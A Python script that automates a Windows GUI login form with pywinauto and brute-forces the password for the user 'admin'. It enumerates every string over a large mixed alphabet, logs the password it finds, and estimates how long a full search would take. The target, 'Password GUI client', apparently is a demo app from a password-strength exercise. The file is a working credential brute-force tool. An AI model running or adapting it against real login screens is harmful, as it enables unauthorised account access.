import sys
import time

if sys.platform == "win32":
    import os

    os.environ["PYTHONIOENCODING"] = "utf-8"
    import _locale

    _locale._getdefaultlocale = (lambda *args: ['en_US', 'utf-8'])
from pywinauto import Application

from custom_logger import dpi_logger

MAX_PASSWORD_LENGTH = 8
MASK = 0x3F
BACK_NEW = "uia"
BACK_OLD = "win32"
APP_TITLE = "Password GUI client"


def format_time(seconds):
    """Преобразует секунды в читаемый формат (годы, месяцы, дни, часы, минуты, секунды)."""
    years = seconds // (365 * 24 * 3600)
    seconds %= (365 * 24 * 3600)
    months = seconds // (30 * 24 * 3600)
    seconds %= (30 * 24 * 3600)
    days = seconds // (24 * 3600)
    seconds %= (24 * 3600)
    hours = seconds // 3600
    seconds %= 3600
    minutes = seconds // 60
    seconds %= 60

    time_parts = []
    if years > 0:
        time_parts.append(f"{int(years)} year{'s' if years != 1 else ''}")
    if months > 0:
        time_parts.append(f"{int(months)} month{'s' if months != 1 else ''}")
    if days > 0:
        time_parts.append(f"{int(days)} day{'s' if days != 1 else ''}")
    if hours > 0:
        time_parts.append(f"{int(hours)} hour{'s' if hours != 1 else ''}")
    if minutes > 0:
        time_parts.append(f"{int(minutes)} minute{'s' if minutes != 1 else ''}")
    if seconds > 0 or not time_parts:
        time_parts.append(f"{seconds:.2f} second{'s' if seconds != 1 else ''}")

    return ", ".join(time_parts)


def build_alphabet(bitmask: int) -> str:
    alphabet = ''
    if bitmask & (1 << 0):
        alphabet += '0123456789'
    if bitmask & (1 << 1):
        alphabet += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    if bitmask & (1 << 2):
        alphabet += "abcdefghijklmnopqrstuvwxyz"
    if bitmask & (1 << 3):
        alphabet += 'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ'
    if bitmask & (1 << 4):
        alphabet += 'абвгдеёжзийклмнопрстуфхцчшщъыьэюя'
    if bitmask & (1 << 5):
        alphabet += '!@#$%^&*()-_=+[]{}|;:\'",.<>/?`~'
    return alphabet


def hack_pass(start_pass_len=1, app_window=None):
    password_field = app_window.child_window(
        auto_id="QApplication.MainWindow.centralwidget.mainStackedWidget.welcomePage.passLineEdit",
        control_type="Edit"
    )
    sign_in_button = app_window.child_window(
        auto_id="QApplication.MainWindow.centralwidget.mainStackedWidget.welcomePage.regLogStackedWidget.logInPage.logInButton",
        control_type="Button"
    )

    alpha = build_alphabet(MASK)
    alpha_len = len(alpha)

    pass_length = start_pass_len
    indexes_list = [0] * pass_length
    attempts = 0

    start_time = time.time()
    while True:
        if not app_window.exists():
            elapsed = time.time() - start_time
            forged_pass = ''.join(alpha[index] for index in indexes_list)
            avg_time_per_attempt = elapsed / attempts if attempts > 0 else 0

            total_combinations = sum(alpha_len ** i for i in range(start_pass_len, MAX_PASSWORD_LENGTH + 1))
            estimated_total_time = total_combinations * avg_time_per_attempt

            dpi_logger.info(f"Brute-force interrupted: Target window 'Password GUI client' was closed")
            dpi_logger.info(f"Last tried password: {forged_pass}")
            dpi_logger.info(f"Total attempts: {attempts}")
            dpi_logger.info(f"Total time: {elapsed:.2f} s")
            dpi_logger.info(f"Avg time per attempt: {avg_time_per_attempt:.5f} s")
            dpi_logger.info(
                f"Estimated time for full brute-force (for alphabet of {alpha_len} symbols, from {start_pass_len} up to {MAX_PASSWORD_LENGTH} chars): {format_time(estimated_total_time)}")
            return

        forged_pass = ''.join(alpha[index] for index in indexes_list)

        elapsed = time.time() - start_time
        dpi_logger.debug(f"[{attempts}] Trying: {forged_pass} | Elapsed: {elapsed:.2f}s")

        attempts += 1
        if try_password(forged_pass, password_field, sign_in_button, app_window):
            elapsed = time.time() - start_time
            avg = elapsed / attempts

            total_combinations = sum(alpha_len ** i for i in range(start_pass_len, MAX_PASSWORD_LENGTH + 1))
            estimated_total_time = total_combinations * avg

            dpi_logger.info(f"Password hacked: {forged_pass}")
            dpi_logger.info(f"Total attempts: {attempts}")
            dpi_logger.info(f"Total time: {elapsed:.2f} s")
            dpi_logger.info(f"Avg time per attempt: {avg:.5f} s")
            dpi_logger.info(
                f"Estimated time for full brute-force (for alphabet of {alpha_len} symbols, from {start_pass_len} up to {MAX_PASSWORD_LENGTH} chars): {format_time(estimated_total_time)}")
            return

        curr_pos = pass_length - 1
        while curr_pos >= 0:
            if (indexes_list[curr_pos] + 1) < alpha_len:
                indexes_list[curr_pos] += 1
                break
            else:
                indexes_list[curr_pos] = 0
                curr_pos -= 1
        else:
            pass_length += 1
            indexes_list = [0] * pass_length


def try_password(password: str, pass_field, sign_button, main_win) -> bool:
    pass_field.set_text(password)
    sign_button.click()
    time.sleep(0.1)

    login_page = main_win.child_window(
        auto_id="QApplication.MainWindow.centralwidget.mainStackedWidget.welcomePage",
        control_type="Group"
    )
    if not login_page.exists():
        return True

    return False


def start_brute(login):
    # Connect to app window
    try:
        app = Application(backend=BACK_NEW).connect(title=APP_TITLE)
    except Exception as e:
        dpi_logger.error(f"Could not connect to window {APP_TITLE}: {e}")
        return

    main_wnd = app.top_window()
    dpi_logger.info(f"Window captured: {main_wnd.window_text()}")

    try:
        login_field = main_wnd.child_window(
            auto_id="QApplication.MainWindow.centralwidget.mainStackedWidget.welcomePage.userNameLineEdit",
            control_type="Edit"
        )
        if login_field.exists():
            login_field.set_text(login)
            time.sleep(0.01)

        # Start brute
        hack_pass(start_pass_len=2, app_window=main_wnd)
    except Exception as e:
        dpi_logger.warning(f"Error: {e}")


if __name__ == "__main__":
    start_brute("admin")

# from pywinauto import Application
#
# app = Application(backend="uia").connect(title="Password GUI client")
# dlg = app.top_window()
# dlg.print_control_identifiers()
